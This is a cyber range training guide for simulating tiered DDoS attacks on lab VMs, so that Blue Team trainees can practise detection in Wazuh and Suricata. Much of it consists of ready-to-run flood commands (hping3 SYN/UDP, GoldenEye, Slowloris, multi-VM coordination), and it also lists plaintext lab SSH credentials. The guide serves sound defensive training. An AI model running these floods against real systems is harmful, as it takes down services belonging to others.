# 🔥 SIMULATING DDoS ATTACKS IN THE CYBER RANGE

> **Cyber Range Training Environment - DDoS Simulation Guide**  
> *Version 2.0 | December 2025*

---

## 📋 Overview

DDoS (Distributed Denial of Service) attacks are a significant risk to any organization with an online presence. This guide presents our **three-tier approach** for simulating DDoS attacks within the Cyber Range training environment, allowing Blue Team trainees to experience, detect, and respond to realistic attack scenarios.

### What You'll Learn

Through these simulations, trainees will discover:
- How many packets are dropped by defensive systems
- How SIEM (Wazuh) and IDS (Suricata) respond during an attack
- What level of service degradation occurs under attack
- How to detect, analyze, and respond to DDoS incidents in real-time

### Three Tiers of DDoS Simulation

| Tier | Description | Duration | Complexity |
|------|-------------|----------|------------|
| **Tier 1** | Single-source attack using basic tools (hping3, GoldenEye) | 2-5 min | Beginner |
| **Tier 2** | Distributed attack from multiple Red Team VMs | 5-10 min | Intermediate |
| **Tier 3** | Full-scale coordinated attack with mixed attack types | 30-60 min | Advanced |

---

## 🏗️ Cyber Range Infrastructure

### Network Topology

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                    CYBER RANGE ATTACK TOPOLOGY                   │
└─────────────────────────────────────────────────────────────────┘

        RED TEAM VMs (Attackers)              BLUE TEAM VMs (Targets)
        ========================              =========================
        
        ┌─────────────────┐                   ┌─────────────────┐
        │ Attack Scheduler│                   │   Blue Team 1   │
        │  10.72.200.61   │                   │  10.72.200.51   │
        └────────┬────────┘                   │  - DVWA  :9080  │
                 │                            │  - bWAPP :9090  │
        ┌────────▼────────┐                   │  - Juice :3000  │
        │Attack Generator │ ═══════════════╗  └────────┬────────┘
        │  10.72.200.62 ⭐│              ║  │          │
        └────────┬────────┘              ║  │  ┌───────▼───────┐
                 │                       ║  └──│ Wazuh SIEM    │
        ┌────────▼────────┐              ║     │ 10.72.200.52  │
        │  Red Team GUI   │              ║     └───────────────┘
        │  10.72.200.63   │              ║
        └────────┬────────┘              ║     ┌─────────────────┐
                 │                       ╠════▶│   Blue Team 2   │
        ┌────────▼────────┐              ║     │  10.72.200.54 ⭐│
        │Botnet Generator1│══════════════╣     │  PRIMARY TARGET │
        │  10.72.200.64   │              ║     │  - DVWA  :9080  │
        └────────┬────────┘              ║     │  - bWAPP :9090  │
                 │                       ║     │  - Juice :3000  │
        ┌────────▼────────┐              ║     └────────┬────────┘
        │Botnet Generator2│══════════════╝             │
        │  10.72.200.65   │                    ┌───────▼───────┐
        └─────────────────┘                    │ Wazuh SIEM    │
                                               │ 10.72.200.55  │
                                               ├───────────────┤
                                               │ Suricata IDS  │
                                               │ 10.72.200.56  │
                                               └───────────────┘
\`\`\`

### VM Credentials

| Component | IP Address | SSH Access | Purpose |
|-----------|-----------|------------|---------|
| Attack Generator ⭐ | 10.72.200.62 | \`mist / Cyber#Range\` | Primary attack execution |
| Botnet Generator 1 | 10.72.200.64 | \`mist / Cyber#Range\` | Distributed attacks |
| Botnet Generator 2 | 10.72.200.65 | \`mist / Cyber#Range\` | Distributed attacks |
| Blue Team 2 (Target) ⭐ | 10.72.200.54 | \`mist / Cyber#Range\` | Primary target with DVWA |
| Wazuh SIEM | 10.72.200.55 | Web: \`:443\` | Security monitoring |
| Suricata/Evebox | 10.72.200.56 | Web: \`:5636\` | Intrusion detection |

### Installed Attack Tools

All Red Team VMs have the following tools installed in \`/opt/\`:

| Tool | Purpose | Command |
|------|---------|---------|
| **GoldenEye** | HTTP flood with keep-alive | \`python3 goldeneye.py <target> -w 50 -s 100\` |
| **HULK** | Randomized HTTP GET flood | \`python3 hulk.py <target>\` |
| **Slowloris** | Slow HTTP connection attack | \`python3 slowloris.py <target>\` |
| **hping3** | SYN/UDP/ICMP flood | \`sudo hping3 -S --flood -p 80 <target>\` |

---

## 🟢 TIER 1 — SINGLE-SOURCE DDoS ATTACK

> **Difficulty:** Beginner | **Duration:** 2-5 minutes | **Attack Source:** 1 VM

### Objective

Execute a basic DDoS attack from a single Red Team VM to understand attack mechanics and observe how Blue Team monitoring tools detect the attack.

### Attack Types Available

1. **SYN Flood** - TCP half-open connection exhaustion
2. **HTTP Flood** - Application-layer request flooding
3. **UDP Flood** - Bandwidth saturation attack
4. **ICMP Flood** - Network layer ping attack

---

### 🔹 Attack 1.1: SYN Flood Attack

A SYN Flood exploits the TCP three-way handshake by sending many SYN packets without completing the handshake, exhausting server connection resources.

#### Step 1: Start Packet Capture on Target

\`\`\`bash
# SSH to Blue Team 2 (target)
ssh mist@10.72.200.54

# Start tcpdump to capture attack traffic
sudo tcpdump -i ens160 'port 9080' -w /tmp/syn_flood_\$(date +%Y%m%d_%H%M%S).pcap &
\`\`\`

#### Step 2: Launch SYN Flood Attack

\`\`\`bash
# SSH to Attack Generator
ssh mist@10.72.200.62

# Execute SYN flood attack (2 minutes)
sudo timeout 120 hping3 -S --flood -p 9080 10.72.200.54
\`\`\`

**Command breakdown:**
- \`-S\` — Send SYN packets only
- \`--flood\` — Send packets as fast as possible
- \`-p 9080\` — Target DVWA on port 9080
- \`timeout 120\` — Limit attack to 2 minutes

#### Expected Output

\`\`\`
HPING 10.72.200.54 (ens160 10.72.200.54): S set, 40 headers + 0 data bytes
hping in flood mode, no replies will be shown

--- 10.72.200.54 hping statistic ---
2847563 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms
\`\`\`

#### Step 3: Monitor in Blue Team Tools

**Wazuh SIEM (http://10.72.200.55:443):**
- Check "Security Events" dashboard
- Look for DoS/DDoS detection alerts
- Observe connection rate anomalies

**Suricata IDS (http://10.72.200.56:5636):**
- Check for TCP SYN flood signatures
- View packet rate graphs
- Analyze source IP distribution

---

### 🔹 Attack 1.2: HTTP Flood Attack (GoldenEye)

HTTP floods target the application layer with legitimate-looking requests, harder to distinguish from normal traffic.

#### Step 1: Start Monitoring

\`\`\`bash
# On Blue Team 2 - capture HTTP traffic
ssh mist@10.72.200.54
sudo tcpdump -i ens160 'port 9080' -w /tmp/http_flood_\$(date +%Y%m%d_%H%M%S).pcap &

# Watch connection count in real-time
watch -n 1 'netstat -an | grep :9080 | wc -l'
\`\`\`

#### Step 2: Launch HTTP Flood

\`\`\`bash
# SSH to Attack Generator
ssh mist@10.72.200.62

# Launch GoldenEye HTTP flood (2 minutes)
cd /opt/GoldenEye
timeout 120 python3 goldeneye.py http://10.72.200.54:9080 -w 50 -s 100
\`\`\`

**Command breakdown:**
- \`-w 50\` — Use 50 concurrent workers
- \`-s 100\` — Each worker maintains 100 connections
- **Total connections:** 5,000 simultaneous

#### Expected Output

\`\`\`
GoldenEye v2.1 - Hitting webserver in mode 'get' with 50 workers
running 100 connections each. Hit CTRL+C to cancel.

[14:23:45] Worker #1: 100 connections | 12,847 hits
[14:23:46] Worker #2: 100 connections | 13,291 hits
...
\`\`\`

#### Metrics to Observe

| Metric | Normal | Under Attack |
|--------|--------|--------------|
| Connections | <50 | 5,000+ |
| Response Time | <100ms | 10-30 seconds |
| CPU Usage | <20% | 80-95% |
| SIEM Alerts | 0 | 15+ DoS alerts |

---

### 🔹 Attack 1.3: Slowloris Attack

Slowloris keeps connections open indefinitely by sending partial HTTP headers, exhausting the server's connection pool without high bandwidth.

\`\`\`bash
# SSH to Attack Generator
ssh mist@10.72.200.62

# Launch Slowloris (10 minutes)
cd /opt/slowloris
timeout 600 python3 slowloris.py 10.72.200.54 -p 9080 -s 500
\`\`\`

**Command breakdown:**
- \`-p 9080\` — Target port
- \`-s 500\` — Open 500 slow connections

---

## 🟡 TIER 2 — DISTRIBUTED DDoS ATTACK

> **Difficulty:** Intermediate | **Duration:** 5-10 minutes | **Attack Sources:** 3 VMs

### Objective

Execute a coordinated DDoS attack from multiple Red Team VMs simultaneously, simulating a real botnet attack. This tests Blue Team's ability to identify distributed attack patterns.

### Attack Architecture

\`\`\`
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│ 10.72.200.62    │     │ 10.72.200.64    │     │ 10.72.200.65    │
│ Attack Generator│     │ Botnet Gen 1    │     │ Botnet Gen 2    │
└────────┬────────┘     └────────┬────────┘     └────────┬────────┘
         │                       │                       │
         │    HTTP FLOOD         │    HTTP FLOOD         │    HTTP FLOOD
         │    (50 workers)       │    (50 workers)       │    (50 workers)
         │                       │                       │
         └───────────────────────┼───────────────────────┘
                                 │
                                 ▼
                   ┌─────────────────────────┐
                   │      BLUE TEAM 2        │
                   │     10.72.200.54        │
                   │  15,000 connections     │
                   │  30,000+ requests/sec   │
                   └─────────────────────────┘
\`\`\`

### Method 1: Manual Distributed Attack

#### Step 1: Prepare All Attack VMs

Open 3 terminal windows and SSH to each Red Team VM:

\`\`\`bash
# Terminal 1 - Attack Generator
ssh mist@10.72.200.62

# Terminal 2 - Botnet Generator 1
ssh mist@10.72.200.64

# Terminal 3 - Botnet Generator 2
ssh mist@10.72.200.65
\`\`\`

#### Step 2: Start Monitoring on Target

\`\`\`bash
# SSH to Blue Team 2
ssh mist@10.72.200.54

# Start packet capture
sudo tcpdump -i ens160 'port 9080' -w /tmp/distributed_ddos_\$(date +%Y%m%d_%H%M%S).pcap &

# Monitor in real-time
watch -n 1 'echo "=== Active Connections ===" && netstat -an | grep :9080 | wc -l && echo "=== By Source IP ===" && netstat -an | grep :9080 | awk "{print \$5}" | cut -d: -f1 | sort | uniq -c | sort -rn | head -5'
\`\`\`

#### Step 3: Launch Coordinated Attack

Run these commands **simultaneously** in all three terminals:

\`\`\`bash
# On ALL three Red Team VMs (10.72.200.62, .64, .65)
cd /opt/GoldenEye && timeout 300 python3 goldeneye.py http://10.72.200.54:9080 -w 50 -s 100
\`\`\`

### Method 2: Automated Distributed Attack (Recommended)

Use the Python orchestrator for coordinated attacks:

\`\`\`bash
# On Control Machine (as root)
cd /home/iftee/Documents/Projects/attackers
source venv/bin/activate

# Run the distributed DDoS executor
python3 ddos_simulation/distributed_ddos_executor.py
\`\`\`

Or use the interactive menu:

\`\`\`bash
cd /home/iftee/Documents/Projects/attackers
sudo ./quick_start.sh
# Select option 3: "Test 1.2: Distributed HTTP Flood (5 min)"
\`\`\`

### Distributed Attack Metrics

| Metric | Single Source (Tier 1) | Distributed (Tier 2) |
|--------|----------------------|---------------------|
| Attack Sources | 1 VM | 3 VMs |
| Total Connections | 5,000 | 15,000 |
| Requests/Second | 10,000 | 30,000+ |
| Network Usage | ~50 Mbps | ~150 Mbps |
| Detection Difficulty | Easy | Moderate |

### What to Look For

**In Wazuh SIEM:**
- Multiple source IPs flagged for DoS behavior
- Correlation rules triggering for distributed attacks
- Geographic analysis (if IPs were external)

**In Suricata IDS:**
- High packet rate from multiple sources
- HTTP flood signatures from different IPs
- Aggregate traffic exceeding thresholds

---

## 🔴 TIER 3 — FULL-SCALE ATTACK SCENARIO

> **Difficulty:** Advanced | **Duration:** 30-60 minutes | **Full Infrastructure**

### Objective

Execute a comprehensive attack scenario combining multiple DDoS techniques, simulating a sophisticated adversary using mixed attack vectors.

### Attack Phases

\`\`\`
Timeline: 0 ──────────── 15min ──────────── 30min ──────────── 45min ──────────── 60min
          │                │                  │                  │                  │
Phase 1:  │████ SYN Flood █│                  │                  │                  │
          │ (Reconnaissance)                  │                  │                  │
          │                │                  │                  │                  │
Phase 2:  │                │███ HTTP Flood ███│                  │                  │
          │                │ (Application Layer)                 │                  │
          │                │                  │                  │                  │
Phase 3:  │                │                  │██ Distributed ███│                  │
          │                │                  │ (Multi-source)   │                  │
          │                │                  │                  │                  │
Phase 4:  │                │                  │                  │██ Slowloris █████│
          │                │                  │                  │ (Exhaustion)     │
          └────────────────┴──────────────────┴──────────────────┴──────────────────┘
\`\`\`

### Phase 1: SYN Flood Reconnaissance (0-15 min)

\`\`\`bash
# From Attack Generator (10.72.200.62)
sudo timeout 900 hping3 -S -p 9080 --flood 10.72.200.54
\`\`\`

### Phase 2: HTTP Flood (15-30 min)

\`\`\`bash
# From Attack Generator (10.72.200.62)
cd /opt/GoldenEye
timeout 900 python3 goldeneye.py http://10.72.200.54:9080 -w 100 -s 200
\`\`\`

### Phase 3: Distributed Attack (30-45 min)

\`\`\`bash
# Run on ALL THREE Red Team VMs simultaneously
cd /opt/GoldenEye
timeout 900 python3 goldeneye.py http://10.72.200.54:9080 -w 75 -s 150
\`\`\`

### Phase 4: Slowloris Exhaustion (45-60 min)

\`\`\`bash
# From multiple VMs
timeout 900 python3 /opt/slowloris/slowloris.py 10.72.200.54 -p 9080 -s 1000
\`\`\`

### Automated Full Scenario

\`\`\`bash
# Use the quick start menu
cd /home/iftee/Documents/Projects/attackers
sudo ./quick_start.sh
# Select option 10: "Run Full Attack Scenario (60 min)"
\`\`\`

---

## 📊 MONITORING & DETECTION

### Real-Time Monitoring Dashboard

#### Wazuh SIEM (Blue Team 2)

- **URL:** http://10.72.200.55:443
- **Default credentials:** Check with instructor

**Key Dashboards:**
- Security Events → DoS/DDoS alerts
- Network → Connection rate graphs
- Integrity → System resource monitoring

#### Suricata IDS (Blue Team 2)

- **URL:** http://10.72.200.56:5636 (Evebox)

**Key Indicators:**
- TCP SYN flood signatures
- HTTP flood patterns
- Unusual traffic spikes

### Terminal-Based Monitoring

\`\`\`bash
# SSH to Blue Team 2
ssh mist@10.72.200.54

# === CONNECTION MONITORING ===
# Watch active connections
watch -n 1 'netstat -an | grep :9080 | wc -l'

# Connections by source IP
watch -n 2 'netstat -an | grep :9080 | awk "{print \$5}" | cut -d: -f1 | sort | uniq -c | sort -rn | head -10'

# === SYSTEM RESOURCES ===
# CPU and memory during attack
htop

# Network interface statistics
watch -n 1 'ifstat -i ens160'

# === PACKET ANALYSIS ===
# Live packet view
sudo tcpdump -i ens160 -c 100 port 9080

# Packet rate
sudo tcpdump -i ens160 port 9080 2>&1 | pv -l -r > /dev/null
\`\`\`

### Expected Alert Patterns

| Attack Type | Wazuh Alert | Suricata Signature |
|-------------|-------------|-------------------|
| SYN Flood | "DoS attack detected" | ET DROP SYN Flood |
| HTTP Flood | "High HTTP request rate" | HTTP DoS attempt |
| Slowloris | "Incomplete HTTP connections" | Slow HTTP attack |
| Distributed | "Multiple DoS sources" | Coordinated attack |

---

## 📁 DATA COLLECTION & ANALYSIS

### Captured Data Locations

| Data Type | Location | Purpose |
|-----------|----------|---------|
| PCAP Files | \`/tmp/ddos_*.pcap\` on Blue Team 2 | Network traffic analysis |
| Wazuh Logs | Elasticsearch indices | SIEM correlation |
| Suricata Alerts | \`/var/log/suricata/eve.json\` | IDS signature matches |
| System Metrics | Captured via monitoring | Performance impact |

### Downloading Captured Data

\`\`\`bash
# From control machine - download PCAP files
scp mist@10.72.200.54:/tmp/ddos_*.pcap ~/captures/

# Download Suricata alerts
scp mist@10.72.200.54:/var/log/suricata/eve.json ~/logs/
\`\`\`

### Feature Extraction with CICFlowMeter

For dataset generation (ML training):

\`\`\`bash
# Extract network flow features
cd /home/iftee/Documents/Projects/attackers/CICFlowMeter
./bin/CICFlowMeter -i ~/captures/ddos_attack.pcap -o ~/datasets/features.csv
\`\`\`

**80+ Features Extracted:**
- Flow duration, packet counts, byte counts
- Inter-arrival times (IAT) statistics
- Flag counts (SYN, ACK, FIN, RST)
- Packet length statistics
- Flow rate metrics

---

## 📝 TRAINING SCENARIOS

### Scenario 1: Basic Detection (15 min)
**Objective:** Detect and identify a SYN flood attack

1. Instructor launches Tier 1 SYN flood
2. Trainees monitor Wazuh for alerts
3. Identify attack source IP
4. Document 5 Indicators of Compromise (IOCs)
5. Write incident summary

### Scenario 2: Distributed Attack Response (30 min)
**Objective:** Handle multi-source DDoS

1. Instructor launches Tier 2 distributed attack
2. Trainees identify multiple attack sources
3. Correlate alerts across SIEM and IDS
4. Propose mitigation strategies
5. Document attack timeline

### Scenario 3: Full Incident Response (60 min)
**Objective:** Complete incident handling

1. Tier 3 full scenario executed
2. Trainees detect initial attack phase
3. Track attack evolution through phases
4. Implement response procedures
5. Create full incident report
6. Present lessons learned

---

## ⚠️ SAFETY & BEST PRACTICES

### Network Isolation

All attacks are confined to the Cyber Range network:
- **Attack Network:** 10.72.200.0/24
- **No Internet Access:** During attack simulations
- **Isolated VLANs:** Blue Teams are segmented

### Attack Limitations

| Parameter | Recommended Limit |
|-----------|------------------|
| Duration | 2-10 minutes per attack |
| Concurrent connections | 15,000 max |
| Packet rate | 50,000 pps max |
| Bandwidth | 200 Mbps max |

### Emergency Stop

If attacks cause unintended issues:

\`\`\`bash
# Stop all attacks immediately
# On ALL Red Team VMs:
sudo pkill -9 hping3
sudo pkill -9 python3
sudo pkill -f goldeneye
sudo pkill -f slowloris
sudo pkill -f hulk
\`\`\`

### Responsible Use

> **⚠️ WARNING:** These tools and techniques are for authorized training purposes only.
> Never use these attacks against production systems or networks without explicit authorization.
> Misuse may violate computer crime laws.

---

## 🚀 QUICK REFERENCE COMMANDS

\`\`\`bash
# ========================================
# QUICK START - DDoS SIMULATION
# ========================================

# Interactive Menu (Recommended)
cd /home/iftee/Documents/Projects/attackers
sudo ./quick_start.sh

# ========================================
# TIER 1 - SINGLE SOURCE ATTACKS
# ========================================

# SYN Flood (2 min)
ssh mist@10.72.200.62 "sudo timeout 120 hping3 -S --flood -p 9080 10.72.200.54"

# HTTP Flood (2 min)
ssh mist@10.72.200.62 "cd /opt/GoldenEye && timeout 120 python3 goldeneye.py http://10.72.200.54:9080 -w 50 -s 100"

# UDP Flood (2 min)
ssh mist@10.72.200.62 "sudo timeout 120 hping3 --udp --flood -p 9080 10.72.200.54"

# ========================================
# TIER 2 - DISTRIBUTED ATTACKS
# ========================================

# Automated distributed attack
cd /home/iftee/Documents/Projects/attackers
source venv/bin/activate
python3 ddos_simulation/distributed_ddos_executor.py

# ========================================
# MONITORING (Blue Team)
# ========================================

# SIEM Dashboard
http://10.72.200.55:443

# IDS Dashboard
http://10.72.200.56:5636

# Live connection monitoring
ssh mist@10.72.200.54 "watch -n 1 'netstat -an | grep :9080 | wc -l'"

# ========================================
# PACKET CAPTURE
# ========================================

# Start capture
ssh mist@10.72.200.54 "sudo tcpdump -i ens160 port 9080 -w /tmp/attack.pcap &"

# Stop capture
ssh mist@10.72.200.54 "sudo pkill tcpdump"

# Download captures
scp mist@10.72.200.54:/tmp/*.pcap ~/captures/
\`\`\`

---

## 📚 ADDITIONAL RESOURCES

### Documentation

- **Full Implementation Guide:** \`/attackers/docs/CYBER_RANGE_DATASET_GENERATION_PLAN.md\`
- **Testing Procedures:** \`/attackers/docs/DDOS_RANSOMWARE_TESTING_GUIDE.md\`
- **Quick Reference:** \`/attackers/docs/READY_TO_TEST.md\`
- **Copilot Instructions:** \`/.github/copilot-instructions.md\`

### Tool References

| Tool | Documentation |
|------|---------------|
| hping3 | \`man hping3\` |
| GoldenEye | https://github.com/jseidl/GoldenEye |
| Slowloris | https://github.com/gkbrk/slowloris |
| CICFlowMeter | https://github.com/ahlashkari/CICFlowMeter |
| Wazuh | https://documentation.wazuh.com |
| Suricata | https://suricata.io/documentation/ |

### Research References

- **CIC IDS 2018 Dataset:** https://www.unb.ca/cic/datasets/ids-2018.html
- **MITRE ATT&CK - DoS:** https://attack.mitre.org/techniques/T1498/

---

> **Document Version:** 2.0  
> **Last Updated:** December 2025  
> **Author:** Cyber Range Team  
> **Environment:** On-Premise VMware Infrastructure (10.72.200.0/24)
